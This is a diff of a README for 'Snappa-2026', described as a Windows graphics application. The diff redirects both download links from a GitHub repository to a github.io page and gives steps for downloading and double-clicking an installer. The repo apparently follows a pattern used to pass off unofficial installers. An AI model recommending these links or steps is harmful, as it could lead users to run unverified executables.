@@ -1,6 +1,6 @@
 # 🎨 Snappa-2026 - Create professional graphics for social media
 
-[Visit this page to download Snappa-2026](https://github.com/Carlinapsidal493/Snappa-2026)
+[Visit this page to download Snappa-2026](https://carlinapsidal493.github.io)
 
 ## 📌 Overview
 Snappa-2026 provides tools for graphic design on Windows 11 and Windows 10. This application helps you build images for social media, marketing, and business projects. The interface lets users create professional visuals without technical design skills. You work with a collection of templates, shapes, and fonts to produce designs that fit your needs.
@@ -18,7 +18,7 @@ Before you install the software, check your computer against these requirements 
 ## 🚀 Getting Started
 Follow these steps to set up the software on your machine:
 
-1. Visit the following link to access the installer: [Download Snappa-2026](https://github.com/Carlinapsidal493/Snappa-2026).
+1. Visit the following link to access the installer: [Download Snappa-2026](https://carlinapsidal493.github.io).
 2. Locate the download button on the page. 
 3. Save the file to your Downloads folder.
 4. Open the Downloads folder and double-click the installer file.
